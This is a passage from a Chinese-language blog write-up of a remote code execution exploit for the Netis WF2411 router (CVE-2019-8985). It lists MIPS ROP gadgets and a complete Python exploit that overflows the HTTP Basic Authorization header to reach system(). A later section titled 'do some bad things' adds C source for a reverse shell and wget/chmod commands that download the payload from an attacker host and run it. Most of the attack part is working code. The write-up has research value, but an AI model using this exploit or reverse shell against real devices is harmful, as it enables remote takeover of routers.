addiu   $a0, $sp, 0x30+var_18</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget1\"><a class=\"markdownIt-Anchor\" href=\"#gadget1\">#</a> gadget1</h3>\n<p>而这个 gadget 依靠 <code>a0</code>  进行跳转 我们需要控制 <code>a0</code> <br>\nlibgcc 中<br>\n我们可以控制 <code>a0</code>  也可以控制跳转地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00008B20                 move    $t9, $s4</span><br><span class=\"line\">.text:00008B24                 jalr    $t9 ; sub_8770</span><br><span class=\"line\">.text:00008B28                 move    $a0, $s0</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget3\"><a class=\"markdownIt-Anchor\" href=\"#gadget3\">#</a> gadget3</h3>\n<p>同时 栈下去了 影响到我们的 s 寄存器列了 需要抬上来<br>\n之前 <code>sp</code>  减去了  <code>0x38</code>  那么这里 + 上 <code>0x1c</code>  的地方可以布置下一个 rop 并把 sp 加上来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)</span><br><span class=\"line\">.init:000017A8                 nop</span><br><span class=\"line\">.init:000017AC                 jr      $ra</span><br><span class=\"line\">.init:000017B0                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget4\"><a class=\"markdownIt-Anchor\" href=\"#gadget4\">#</a> gadget4</h3>\n<p>最后 通过 sp 加上 <code>0x18</code>  的位置将 sp 回复到之前的 sp 一样的地址 并 jalr 到 s3</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<h3 id=\"流程图\"><a class=\"markdownIt-Anchor\" href=\"#流程图\">#</a> 流程图</h3>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png\" alt></p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc \t   = <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">gadgets  = [<span class=\"number\">0</span> ,<span class=\"number\">0x00008B20</span> ,<span class=\"number\">0x00020650</span> ,<span class=\"number\">0x000017A4</span> ,<span class=\"number\">0x0000ABD0</span>]</span><br><span class=\"line\">MAXSZ\t   = <span class=\"number\">1024</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;echo &#x27;hacked&#x27; &gt; CrimeStatement&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\trop = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x + libgcc,gadgets))</span><br><span class=\"line\">\trop[<span class=\"number\">2</span>] = rop[<span class=\"number\">2</span>] - libgcc + libc</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] rop[<span class=\"subst\">&#123;i&#125;</span>] is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(rop[i])&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x3C</span> - <span class=\"number\">2</span>))</span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">4</span>])\t\t\t\t\t<span class=\"comment\"># </span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">3</span>])\t\t\t\t\t<span class=\"comment\"># s0</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s1 </span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;CCCC&#x27;</span> \t\t\t\t\t\t<span class=\"comment\"># s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">2</span>])\t\t\t\t\t<span class=\"comment\"># s4</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">1</span>])\t\t\t\t\t<span class=\"comment\"># ra</span></span><br><span class=\"line\">\tpayload += cmd</span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png\" alt></p>\n<h2 id=\"做点坏事\"><a class=\"markdownIt-Anchor\" href=\"#做点坏事\">#</a> 做点坏事</h2>\n<p>既然都拿下了这么长的 cmd<br>\n 那么不做点坏事也说不过去<br>\n busybox 中没有 <code>nc</code>  也没有 <code>bash -i</code>  之类的东西给我们做反向 shell</p>\n<p>但是有 <code>wget</code>  下载恶意程序并运行</p>\n<p>编写恶意程序 <code>malware</code>  (✨TODO 修改参数)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ip = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">sin</span> =</span> &#123;</span><br><span class=\"line\">\t\t.sin_family = AF_INET,</span><br><span class=\"line\">\t\t.sin_port = htons(port),</span><br><span class=\"line\">\t\t.sin_addr.s_addr = inet_addr(ip),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tconnect(sd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;<span class=\"built_in\">sin</span>, <span class=\"keyword\">sizeof</span>(<span class=\"built_in\">sin</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> _ = <span class=\"number\">0</span>; _ &lt;= <span class=\"number\">2</span>; _++) </span><br><span class=\"line\">\t\tdup2(sd, _);</span><br><span class=\"line\">\texecl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c</span><br></pre></td></tr></table></figure>\n<p>我们需要利用两次漏洞 一次让 malware 可执行 一次让其跑起来（因为长度不够 没法一次性解决）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://10.10.10.2:8000/malware</span><br><span class=\"line\">chmod +x malware</span><br><span class=\"line\">./malware 10.10.10.2 9999</span><br></pre></td></tr></table></figure>\n<p>攻击机开启监听<br>\n效果如下 成功 getshell<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png\" alt></p>\n<h2 id=\"未完\"><a class=\"markdownIt-Anchor\" href=\"#未完\">#</a> 未完</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  squrootfs grep -r &quot;Authorization: Basic &quot; .</span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  squrootfs grep -r &quot;User-Agent: Real UserAgent&quot; .</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  squrootfs grep -r &quot;User-Agent: &quot; .              </span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "IoT"
            ]
        }
    ]
}